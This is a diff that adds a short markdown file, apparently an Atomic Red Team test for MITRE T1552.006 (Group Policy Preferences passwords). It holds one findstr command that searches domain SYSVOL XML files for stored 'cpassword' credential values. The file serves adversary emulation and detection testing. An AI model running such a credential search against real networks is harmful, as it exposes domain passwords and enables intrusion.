@@ -1,0 +1,7 @@
+################T1552.006.md################
+
+##Atomic Test #1 - GPP Passwords (findstr)
+
+```findstr /S cpassword %logonserver%\sysvol\*.xml```
+
+```PAUSE```
